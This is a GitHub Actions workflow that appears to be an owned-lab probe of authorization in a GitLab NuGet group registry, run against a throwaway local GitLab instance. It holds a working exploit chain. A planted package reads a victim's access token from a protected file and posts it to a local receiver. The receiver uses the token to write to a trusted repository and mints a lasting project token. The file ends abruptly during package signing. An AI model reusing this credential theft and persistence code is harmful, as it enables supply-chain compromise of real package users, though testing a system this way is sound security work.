name: Owned NuGet group SDK10 LTS authorization probe

on:
  workflow_dispatch:
  push:
    branches:
      - pa30-rank23-l108-gitlab-split-20261128

permissions:
  contents: read

jobs:
  downstream-write:
    runs-on: ubuntu-24.04
    timeout-minutes: 50
    steps:
      - name: Check isolated runner capacity
        shell: bash
        run: |
          set -euo pipefail
          df -h /
          free -h
          available_kib=$(df --output=avail -k / | tail -n 1)
          test "$available_kib" -ge 9000000

      - name: Install supported .NET SDK
        uses: actions/setup-dotnet@v5
        with:
          dotnet-version: 10.0.404

      - name: Pin exact SDK selection before GitLab startup
        shell: bash
        run: |
          set -euo pipefail
          printf '%s\n' '{"sdk":{"version":"10.0.404","rollForward":"disable"}}' > "$GITHUB_WORKSPACE/global.json"
          cp "$GITHUB_WORKSPACE/global.json" "$RUNNER_TEMP/global.json"
          test "$(dotnet --version)" = "10.0.404"
          (cd "$RUNNER_TEMP" && test "$(dotnet --version)" = "10.0.404")

      - name: Start ephemeral GitLab CE 19.6.2
        shell: bash
        run: |
          set -euo pipefail
          root_password=$(openssl rand -hex 24)
          echo "::add-mask::$root_password"
          docker run --detach --rm --name l108-owned-gitlab \
            --shm-size 512m \
            --publish 127.0.0.1:8929:8929 \
            --env GITLAB_ROOT_PASSWORD="$root_password" \
            --env GITLAB_OMNIBUS_CONFIG="external_url 'http://127.0.0.1:8929'; prometheus_monitoring['enable'] = false;" \
            gitlab/gitlab-ce:19.6.2-ce.0 >/dev/null
          ready=0
          for attempt in $(seq 1 120); do
            if curl --silent --fail --output /dev/null \
              http://127.0.0.1:8929/users/sign_in; then
              ready=1
              break
            fi
            if ! docker inspect --format '{{.State.Running}}' l108-owned-gitlab | grep -qx true; then
              echo "GitLab container stopped before readiness"
              exit 1
            fi
            sleep 10
          done
          test "$ready" -eq 1
          docker exec l108-owned-gitlab gitlab-rails runner \
            "s=SecureRandom.alphanumeric(20); t=User.find_by_username('root').personal_access_tokens.create!(scopes: ['api'], name: 'l108-ephemeral-root', expires_at: 2.days.from_now); t.set_token(s); t.save!; File.write('/tmp/l108-root-token', s)" >/dev/null
          docker cp l108-owned-gitlab:/tmp/l108-root-token "$RUNNER_TEMP/l108-root-token" >/dev/null
          chmod 600 "$RUNNER_TEMP/l108-root-token"
          echo "Ephemeral GitLab is ready; admin token retained only on this runner."

      - name: Test signed policy and lower-actor protected GitLab write
        shell: bash
        run: |
          set -euo pipefail
          python3 - <<'PY'
          import datetime
          import base64
          import hashlib
          import json
          import os
          import pathlib
          import re
          import secrets
          import shutil
          import subprocess
          import threading
          import textwrap
          import time
          import urllib.error
          import urllib.request
          from xml.sax.saxutils import escape

          base = "http://127.0.0.1:8929"
          temp = pathlib.Path(os.environ["RUNNER_TEMP"]) / "l108-probe"
          temp.mkdir(mode=0o700, exist_ok=True)
          root_token = (pathlib.Path(os.environ["RUNNER_TEMP"]) / "l108-root-token").read_text().strip()
          print("::add-mask::" + root_token)
          summary = {"gitlab_image": "gitlab/gitlab-ce:19.6.2-ce.0",
                     "sdk": subprocess.check_output(["dotnet", "--version"], text=True).strip(),
                     "controls": []}
          if summary["sdk"] != "10.0.404":
              raise RuntimeError("SDK selection mismatch: " + summary["sdk"])

          protected_bytes = b"INERT_OWNED_L108_" + secrets.token_bytes(24)
          protected_file = temp / "victim-only"
          protected_file.write_bytes(protected_bytes)
          protected_file.chmod(0o600)
          summary["protected_file"] = {"mode": oct(protected_file.stat().st_mode & 0o777),
                                       "sha256": hashlib.sha256(protected_bytes).hexdigest()}

          def request(method, path, data=None, token=None, basic=None):
              headers = {}
              if token:
                  headers["PRIVATE-TOKEN"] = token
              if basic:
                  headers["Authorization"] = "Basic " + base64.b64encode(
                      (basic[0] + ":" + basic[1]).encode()).decode()
              body = None
              if data is not None:
                  headers["Content-Type"] = "application/json"
                  body = json.dumps(data).encode()
              req = urllib.request.Request(base + path, data=body, headers=headers, method=method)
              try:
                  with urllib.request.urlopen(req, timeout=60) as response:
                      raw = response.read()
                      try:
                          return response.status, json.loads(raw)
                      except json.JSONDecodeError:
                          return response.status, raw.decode(errors="replace")
              except urllib.error.HTTPError as error:
                  return error.code, error.read().decode(errors="replace")

          def must(method, path, data=None, token=None, status=201):
              code, value = request(method, path, data, token)
              if code != status:
                  raise RuntimeError(f"{method} {path}: HTTP {code}; {str(value)[:350]}")
              return value

          suffix = os.environ["GITHUB_RUN_ID"]
          group = must("POST", "/api/v4/groups",
                       {"name": "Owned registry split " + suffix,
                        "path": "l108-owned-" + suffix, "visibility": "private"},
                       root_token)
          gid = group["id"]
          a = must("POST", "/api/v4/projects",
                   {"name": "trusted-a", "path": "trusted-a",
                    "namespace_id": gid, "visibility": "private",
                    "initialize_with_readme": True}, root_token)
          b = must("POST", "/api/v4/projects",
                   {"name": "lower-b", "path": "lower-b",
                    "namespace_id": gid, "visibility": "private"}, root_token)
          branch_code = None
          for _ in range(30):
              branch_code, _ = request(
                  "GET", f"/api/v4/projects/{a['id']}/repository/branches/main",
                  token=root_token)
              if branch_code == 200:
                  break
              time.sleep(1)
          summary["trusted_a_main_http"] = branch_code
          if branch_code != 200:
              raise RuntimeError("Trusted A main branch was not initialized")
          users = {}
          for role in ("publisher", "reader", "victim"):
              user = must("POST", "/api/v4/users",
                          {"username": "l108" + role + suffix,
                           "name": "Owned " + role,
                           "email": "l108" + role + suffix + "@example.invalid",
                           "password": secrets.token_urlsafe(32),
                           "skip_confirmation": True},
                          root_token)
              users[role] = user
          must("POST", f"/api/v4/projects/{b['id']}/members",
               {"user_id": users["publisher"]["id"], "access_level": 30}, root_token)
          must("POST", f"/api/v4/groups/{gid}/members",
               {"user_id": users["reader"]["id"], "access_level": 20}, root_token)
          must("POST", f"/api/v4/projects/{a['id']}/members",
               {"user_id": users["victim"]["id"], "access_level": 40}, root_token)
          tokens = {}
          token_ids = {}
          for role, user in users.items():
              token_result = must(
                  "POST", f"/api/v4/users/{user['id']}/personal_access_tokens",
                  {"name": "l108-ephemeral-" + role, "scopes": ["api"],
                   "expires_at": (datetime.date.today() + datetime.timedelta(days=1)).isoformat()},
                  root_token)
              tokens[role] = token_result["token"]
              token_ids[role] = token_result["id"]
              print("::add-mask::" + tokens[role])
          summary["group_id"] = gid
          summary["projects"] = {"trusted_a": a["id"], "lower_b": b["id"]}
          summary["roles"] = {"publisher": "Developer on B only",
                              "reader": "Reporter on group",
                              "victim": "Maintainer on A only"}
          protected_bytes = tokens["victim"].encode()
          protected_file.write_bytes(protected_bytes)
          protected_file.chmod(0o600)
          summary["protected_file"] = {"mode": oct(protected_file.stat().st_mode & 0o777),
                                       "sha256": hashlib.sha256(protected_bytes).hexdigest(),
                                       "kind": "ephemeral owned GitLab A-Maintainer PAT"}

          lower_events = pathlib.Path("/tmp") / ("l108-events-" + suffix + ".jsonl")
          retained_event = pathlib.Path("/tmp") / ("l108-retained-" + suffix + ".json")
          after_removal_event = pathlib.Path("/tmp") / ("l108-after-removal-" + suffix + ".json")
          rotation_event = pathlib.Path("/tmp") / ("l108-rotation-" + suffix + ".json")
          after_rotation_event = pathlib.Path("/tmp") / ("l108-after-rotation-" + suffix + ".json")
          after_token_revoke_event = pathlib.Path("/tmp") / ("l108-after-token-revoke-" + suffix + ".json")
          project_token_file = pathlib.Path("/tmp") / ("l108-project-token-" + suffix)
          lower_port = pathlib.Path("/tmp") / ("l108-port-" + suffix)
          lower_server = pathlib.Path("/tmp") / ("l108-server-" + suffix + ".py")
          lower_server.write_text(textwrap.dedent(f"""
              import hashlib, json, os, pathlib, urllib.error, urllib.request
              from http.server import BaseHTTPRequestHandler, ThreadingHTTPServer
              BASE = {base!r}
              PROJECT = {a["id"]!r}
              EVENTS = pathlib.Path({str(lower_events)!r})
              RETAINED_EVENT = pathlib.Path({str(retained_event)!r})
              AFTER_REMOVAL_EVENT = pathlib.Path({str(after_removal_event)!r})
              ROTATION_EVENT = pathlib.Path({str(rotation_event)!r})
              AFTER_ROTATION_EVENT = pathlib.Path({str(after_rotation_event)!r})
              AFTER_TOKEN_REVOKE_EVENT = pathlib.Path({str(after_token_revoke_event)!r})
              PROJECT_TOKEN_FILE = pathlib.Path({str(project_token_file)!r})
              PORT = pathlib.Path({str(lower_port)!r})
              SUFFIX = {suffix!r}
              EXPIRES = {(datetime.date.today() + datetime.timedelta(days=2)).isoformat()!r}
              ROTATED_EXPIRES = {(datetime.date.today() + datetime.timedelta(days=5)).isoformat()!r}
              count = 0
              class Handler(BaseHTTPRequestHandler):
                  def do_POST(self):
                      global count
                      count += 1
                      token = self.rfile.read(int(self.headers.get("Content-Length", "0")))
                      path = "owned-l108-downstream-" + SUFFIX + "-" + str(count) + ".txt"
                      payload = json.dumps({{
                          "branch": "main",
                          "content": "INERT_L108_PROTECTED_WRITE_" + str(count),
                          "commit_message": "Owned L108 authorization control"
                      }}).encode()
                      req = urllib.request.Request(
                          BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/{{path}}",
                          data=payload,
                          headers={{"PRIVATE-TOKEN": token.decode(),
                                   "Content-Type": "application/json"}},
                          method="POST")
                      try:
                          with urllib.request.urlopen(req, timeout=45) as response:
                              status = response.status
                      except urllib.error.HTTPError as error:
                          status = error.code
                      event = {{"uid": os.getuid(), "token_sha256": hashlib.sha256(token).hexdigest(),
                               "gitlab_write_http": status, "path": path}}
                      if count == 3:
                          mint_payload = json.dumps({{
                              "name": "owned-l108-retained-" + SUFFIX,
                              "scopes": ["api"], "access_level": 40,
                              "expires_at": EXPIRES
                          }}).encode()
                          mint_request = urllib.request.Request(
                              BASE + f"/api/v4/projects/{{PROJECT}}/access_tokens",
                              data=mint_payload,
                              headers={{"PRIVATE-TOKEN": token.decode(),
                                       "Content-Type": "application/json"}},
                              method="POST")
                          try:
                              with urllib.request.urlopen(mint_request, timeout=45) as response:
                                  mint_status = response.status
                                  minted = json.load(response)
                          except urllib.error.HTTPError as error:
                              mint_status = error.code
                              minted = {{}}
                          event["project_token_create_http"] = mint_status
                          if mint_status == 201 and minted.get("token"):
                              project_token = minted["token"]
                              PROJECT_TOKEN_FILE.write_text(project_token)
                              PROJECT_TOKEN_FILE.chmod(0o600)
                              event["project_token_sha256"] = hashlib.sha256(
                                  project_token.encode()).hexdigest()
                              event["project_token_id"] = minted.get("id")
                              event["project_token_expires_at"] = minted.get("expires_at")
                      with EVENTS.open("a") as out:
                          out.write(json.dumps(event) + "\\n")
                      self.send_response(204)
                      self.end_headers()
                  def do_GET(self):
                      if self.path == "/rotate-project-token" and PROJECT_TOKEN_FILE.exists():
                          old_token = PROJECT_TOKEN_FILE.read_text()
                          rotate_payload = json.dumps({{
                              "expires_at": ROTATED_EXPIRES
                          }}).encode()
                          rotate_request = urllib.request.Request(
                              BASE + f"/api/v4/projects/{{PROJECT}}/access_tokens/self/rotate",
                              data=rotate_payload,
                              headers={{"PRIVATE-TOKEN": old_token,
                                       "Content-Type": "application/json"}},
                              method="POST")
                          try:
                              with urllib.request.urlopen(rotate_request, timeout=45) as response:
                                  rotate_status = response.status
                                  rotated = json.load(response)
                          except urllib.error.HTTPError as error:
                              rotate_status = error.code
                              rotated = {{}}
                          rotation = {{"uid": os.getuid(), "rotation_http": rotate_status,
                                      "old_token_sha256": hashlib.sha256(
                                          old_token.encode()).hexdigest(),
                                      "requested_expires_at": ROTATED_EXPIRES}}
                          if rotate_status == 200 and rotated.get("token"):
                              new_token = rotated["token"]
                              PROJECT_TOKEN_FILE.write_text(new_token)
                              PROJECT_TOKEN_FILE.chmod(0o600)
                              rotation["new_token_sha256"] = hashlib.sha256(
                                  new_token.encode()).hexdigest()
                              rotation["rotated_token_id"] = rotated.get("id")
                              rotation["rotated_expires_at"] = rotated.get("expires_at")
                              old_path = "owned-l108-old-rotated-denied-" + SUFFIX + ".txt"
                              old_payload = json.dumps({{
                                  "branch": "main", "content": "INERT_OLD_ROTATED_DENIED",
                                  "commit_message": "Owned old-token denial control"
                              }}).encode()
                              old_request = urllib.request.Request(
                                  BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/{{old_path}}",
                                  data=old_payload,
                                  headers={{"PRIVATE-TOKEN": old_token,
                                           "Content-Type": "application/json"}},
                                  method="POST")
                              try:
                                  with urllib.request.urlopen(old_request, timeout=45) as response:
                                      old_status = response.status
                              except urllib.error.HTTPError as error:
                                  old_status = error.code
                              rotation["old_token_write_http"] = old_status
                              rotation["old_token_denied_path"] = old_path
                          ROTATION_EVENT.write_text(json.dumps(rotation))
                          self.send_response(204)
                          self.end_headers()
                          return
                      if self.path not in ("/retained", "/after-member-removal",
                                           "/after-project-token-rotation",
                                           "/after-project-token-revoke") or not PROJECT_TOKEN_FILE.exists():
                          self.send_response(404)
                          self.end_headers()
                          return
                      project_token = PROJECT_TOKEN_FILE.read_text()
                      if self.path == "/retained":
                          path = "owned-l108-retained-" + SUFFIX + ".txt"
                          content = "INERT_L108_RETAINED_AFTER_REVOKE"
                          event_path = RETAINED_EVENT
                      elif self.path == "/after-member-removal":
                          path = "owned-l108-after-member-removal-" + SUFFIX + ".txt"
                          content = "INERT_L108_AFTER_MEMBER_REMOVAL"
                          event_path = AFTER_REMOVAL_EVENT
                      elif self.path == "/after-project-token-rotation":
                          path = "owned-l108-after-token-rotation-" + SUFFIX + ".txt"
                          content = "INERT_L108_AFTER_TOKEN_ROTATION"
                          event_path = AFTER_ROTATION_EVENT
                      else:
                          path = "owned-l108-after-token-revoke-" + SUFFIX + ".txt"
                          content = "INERT_L108_AFTER_TOKEN_REVOKE_DENIED"
                          event_path = AFTER_TOKEN_REVOKE_EVENT
                      payload = json.dumps({{
                          "branch": "main", "content": content,
                          "commit_message": "Owned L108 retained-token control"
                      }}).encode()
                      request = urllib.request.Request(
                          BASE + f"/api/v4/projects/{{PROJECT}}/repository/files/{{path}}",
                          data=payload,
                          headers={{"PRIVATE-TOKEN": project_token,
                                   "Content-Type": "application/json"}},
                          method="POST")
                      try:
                          with urllib.request.urlopen(request, timeout=45) as response:
                              status = response.status
                      except urllib.error.HTTPError as error:
                          status = error.code
                      event_path.write_text(json.dumps({{
                          "uid": os.getuid(), "project_token_sha256": hashlib.sha256(
                              project_token.encode()).hexdigest(),
                          "gitlab_write_http": status, "path": path
                      }}))
                      self.send_response(204)
                      self.end_headers()
                  def log_message(self, *_):
                      pass
              server = ThreadingHTTPServer(("127.0.0.1", 0), Handler)
              PORT.write_text(str(server.server_port))
              server.serve_forever()
          """))
          lower_server.chmod(0o644)
          lower_process = subprocess.Popen(
              ["sudo", "-u", "nobody", "python3", "-u", str(lower_server)],
              stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
          for _ in range(100):
              if lower_port.exists():
                  break
              if lower_process.poll() is not None:
                  raise RuntimeError("Lower receiver stopped before readiness")
              time.sleep(0.1)
          if not lower_port.exists():
              raise RuntimeError("Lower receiver did not start")
          callback = "http://127.0.0.1:" + lower_port.read_text().strip() + "/owned-receiver"
          def read_events():
              if not lower_events.exists():
                  return []
              return [json.loads(line) for line in lower_events.read_text().splitlines()]

          denied_file = subprocess.run(
              ["sudo", "-u", "nobody", "cat", str(protected_file)],
              capture_output=True, timeout=15)
          summary["controls"].append({"case": "lower_os_read_protected_file",
                                      "exit": denied_file.returncode})
          if denied_file.returncode == 0:
              raise RuntimeError("Lower OS identity read protected file")

          denied_get, _ = request("GET", f"/api/v4/projects/{a['id']}",
                                  token=tokens["publisher"])
          summary["controls"].append({"case": "publisher_get_trusted_a", "http": denied_get})
          if denied_get not in (403, 404):
              raise RuntimeError("Publisher unexpectedly reads trusted A project")
          denied_write, _ = request(
              "POST",
              f"/api/v4/projects/{a['id']}/repository/files/owned-l108-lower-denied.txt",
              {"branch": "main", "content": "INERT_DENIED",
               "commit_message": "Owned denied authorization control"},
              token=tokens["publisher"])
          summary["controls"].append({"case": "lower_publisher_write_trusted_a",
                                      "http": denied_write})
          if denied_write not in (403, 404):
              raise RuntimeError("Lower publisher unexpectedly wrote trusted A repository")
          denied_mint, _ = request(
              "POST", f"/api/v4/projects/{a['id']}/access_tokens",
              {"name": "owned-l108-lower-denied", "scopes": ["api"],
               "access_level": 40,
               "expires_at": (datetime.date.today() + datetime.timedelta(days=2)).isoformat()},
              token=tokens["publisher"])
          summary["controls"].append({"case": "lower_publisher_mint_trusted_a_token",
                                      "http": denied_mint})
          if denied_mint not in (403, 404):
              raise RuntimeError("Lower publisher unexpectedly minted trusted A project token")
          reader_get, _ = request("GET", f"/api/v4/projects/{a['id']}",
                                  token=tokens["reader"])
          summary["controls"].append({"case": "reader_get_trusted_a", "http": reader_get})
          if reader_get != 200:
              raise RuntimeError("Reader cannot access trusted A project")
          basic_index, _ = request(
              "GET", f"/api/v4/groups/{gid}/-/packages/nuget/index.json",
              basic=(users["reader"]["username"], tokens["reader"]))
          summary["controls"].append({"case": "reader_basic_group_index", "http": basic_index})
          if basic_index != 200:
              raise RuntimeError(f"Reader Basic auth failed on group index: {basic_index}")

          def make_package(series, marker):
              package_id = f"Owned.RegistryProbe.{suffix}.{series}"
              command = "ownedprobe" + series.lower()
              directory = temp / "source" / series / marker
              directory.mkdir(parents=True, exist_ok=True)
              project = directory / "Probe.csproj"
              project.write_text(
                  '<Project Sdk="Microsoft.NET.Sdk"><PropertyGroup>'
                  '<TargetFramework>net10.0</TargetFramework><OutputType>Exe</OutputType>'
                  '<PackAsTool>true</PackAsTool><ToolCommandName>' + command + '</ToolCommandName>'
                  '<PackageId>' + package_id + '</PackageId><Version>1.0.0</Version>'
                  '<Authors>OwnedLab</Authors></PropertyGroup></Project>')
              program = 'System.Console.WriteLine("OWNED_' + marker + '");'
              if series.startswith("Impact") and marker == "B":
                  program = (
                      'using System.Net.Http; '
                      'var path = System.Environment.GetEnvironmentVariable("L108_PROTECTED_PATH"); '
                      'var url = System.Environment.GetEnvironmentVariable("L108_OWNED_RECEIVER"); '
                      'if (path != null && url != null) { '
                      'using var client = new HttpClient(); '
                      'var response = client.PostAsync(url, '
                      'new ByteArrayContent(System.IO.File.ReadAllBytes(path))).GetAwaiter().GetResult(); '
                      'response.EnsureSuccessStatusCode(); } '
                      'System.Console.WriteLine("OWNED_B");')
              (directory / "Program.cs").write_text(program)
              output = temp / "built" / series / marker
              output.mkdir(parents=True, exist_ok=True)
              result = subprocess.run(
                  ["dotnet", "pack", str(project), "-c", "Release", "-o", str(output),
                   "--nologo", "--verbosity", "quiet"],
                  capture_output=True, text=True, timeout=180)
              if result.returncode:
                  raise RuntimeError("dotnet pack failed: " + (result.stdout + result.stderr)[-700:])
              package = next(output.glob("*.nupkg"))
              return package_id, command, package

          packages = {}
          for series in ("Primary", "Reverse", "Impact", "ImpactReverse"):
              for marker in ("A", "B"):
                  packages[(series, marker)] = make_package(series, marker)

          certificate_dir = temp / "signing"
          certificate_dir.mkdir()
          certificate = certificate_dir / "author.pem"
          key = certificate_dir / "author.key"
          pfx = certificate_dir / "author.pfx"
          pfx_password = secrets.token_urlsafe(32)
          subprocess.run(
              ["openssl", "req", "-x509", "-newkey", "rsa:3072", "-sha256",
               "-nodes", "-keyout", str(key), "-out", str(certificate),
               "-days", "2", "-subj", "/CN=Owned-L108-Author"],
              check=True, capture_output=True, timeout=60)
          subprocess.run(
              ["openssl", "pkcs12", "-export", "-out", str(pfx),
               "-inkey", str(key), "-in", str(certificate),
               "-passout", "pass:" + pfx_password],
              check=True, capture_output=True, timeout=30)
          cert_der = subprocess.check_output(
              ["openssl", "x509", "-in", str(certificate), "-outform", "DER"])
          certificate_fingerprint = hashlib.sha256(cert_der).hexdigest().upper()
          summary["author_certificate_sha256"] = certificate_fingerprint
          attacker_certificate = certificate_dir / "other-author.pem"
          attacker_key = certificate_dir / "other-author.key"
          attacker_pfx = certificate_dir / "other-author.pfx"
          attacker_pfx_password = secrets.token_urlsafe(32)
          subprocess.run(
              ["openssl", "req", "-x509", "-newkey", "rsa:3072", "-sha256",
               "-nodes", "-keyout", str(attacker_key), "-out", str(attacker_certificate),
               "-days", "2", "-subj", "/CN=Owned-L108-Other-Author"],
              check=True, capture_output=True, timeout=60)
          subprocess.run(
              ["openssl", "pkcs12", "-export", "-out", str(attacker_pfx),
               "-inkey", str(attacker_key), "-in", str(attacker_certificate),
               "-passout", "pass:" + attacker_pfx_password],
              check=True, capture_output=True, timeout=30)
          attacker_cert_der = subprocess.check_output(
              ["openssl", "x509", "-in", str(attacker_certificate), "-outform", "DER"])
          attacker_fingerprint = hashlib.sha256(attacker_cert_der).hexdigest().upper()
          summary["other_author_certificate_sha256"] = attacker_fingerprint
          signer_xml = (
              '<config><add key="signatureValidationMode" value="require"/></config>'
              '<trustedSigners><author name="OwnedL108Author"><certificate fingerprint="' +
              certificate_fingerprint +
              '" hashAlgorithm="SHA256" allowUntrustedRoot="true"/></author></trustedSigners>')
          for series in ("Impact", "ImpactReverse"):
              for marker in ("A", "B"):
                  package = packages[(series, marker)][2]
                  signer_pfx = pfx if marker == "A" else attacker_pfx
                  signer_password = pfx_password if marker == "A" else attacker_pfx_password
                  signed = subprocess.run(
                      ["dotnet", "nuget", "sign", str(package),
                       "--certificate-path", str(signer_pfx),
                       "--certificate-password", signer_password,
                       "--allow-untrusted-root", "--overwrite", "--verbosity", "quiet"],
                      capture_output=True, text=True, timeout=120)
